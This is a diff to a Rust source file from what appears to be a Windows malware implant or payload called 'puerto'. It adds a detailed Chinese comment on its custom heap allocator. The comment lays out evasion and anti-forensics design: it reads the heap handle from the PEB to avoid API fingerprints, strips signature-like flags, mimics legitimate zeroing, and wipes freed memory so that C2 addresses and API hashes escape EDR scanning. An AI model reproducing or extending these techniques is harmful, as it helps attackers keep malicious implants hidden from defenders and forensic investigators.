@@ -13,13 +13,48 @@
 // 1.链接外部win的函数时,会在IAT中留下记录
 
 
-// 该文件实现内存分配的逻辑是什么?一步一步的说明,比如1.新建一个空WinHeap结构,作为.. 2. 在该结构体实现get获取..
+// 该文件实现内存分配的逻辑是什么?
+/*
+该文件实现 `puerto` 载荷的全局内存分配逻辑，核心流程如下：
+
+1. 定义 `WinHeap` 单元结构体：
+   作为 Rust `GlobalAlloc` trait 的实现载体，由于它是单元结构体，不占用额外空间。
+
+2. 实现堆句柄获取逻辑 (`get` 方法)：
+   - 通过读取 PEB (Process Environment Block) 偏移 0x30 (x64) 处直接获取进程默认堆句柄。
+   - 绕过 Kernel32.dll!GetProcessHeap，减少 API 调用指纹。
+
+3. 实现 `GlobalAlloc` Trait (Rust 内存管理契约)：
+
+   A. 分配阶段 (`alloc`)：
+      1. 从 Rust 编译器传入的 `Layout` 中提取所需的 `size` (字节数)。
+      2. 调用底层 `ntdll.dll!RtlAllocateHeap`：
+         - 传入 `Flags = 0` (弃用 0x8 标志以消除 Magic Number 特征)。
+         - 传入进程堆句柄及大小。
+      3. 错误处理：检查返回指针是否为 null，确保系统稳定性。
+      4. 【OPSEC 加固】：手动调用 `core::ptr::write_bytes` 将新分配的内存清零。
+         - 这不仅保证了内存干净，还通过“手动初始化”模拟了合法程序的行为，隐藏了系统自动清零的特征。
+
+   B. 释放阶段 (`dealloc`)：
+      1. 【防取证加固】：在真正释放前，利用 `Layout` 提供的原始大小，再次调用 `write_bytes`。
+         - 将该块内存填充为 0 或噪声数据，确保敏感信息（如 API Hash、C2 地址）不会残留在空闲堆空间中被 EDR 扫描提取。
+      2. 调用底层 `ntdll.dll!RtlFreeHeap`：
+         - 归还内存。由于堆管理器在分配时已在指针前存有 Heap Header，此处无需传 size。
+
+4. 注册全局分配器 (`#[global_allocator]`)：
+   - 告知 Rust 编译器，整个载荷中所有的 `Box`、`Vec`、`String`、`format!` 等高级类型均通过此 `WinHeap` 进行内存管理。
+   - 实现了在 `no_std` 环境下的“无感”动态内存支持。
+
+5. 引导加载优化 (Bootstrapping)：
+   - 配合 `module.rs` 中的“零分配查找”技术，在分配器真正运行前，动态定位 `Rtl` 系列函数地址。
+   - 彻底打破“查找 API 需要内存 -> 内存分配需要 API 地址”的逻辑死锁。
+*/
 
 
 use core::{alloc::GlobalAlloc, ptr::null_mut};
 use core::ffi::{c_void};
 use core::ptr::write_bytes;
-use spin::lock_api::Mutex;
+
 
 // 获取当前进程的默认heap handle
 use crate::{types::HANDLE, winapis::GetProcessHeap};
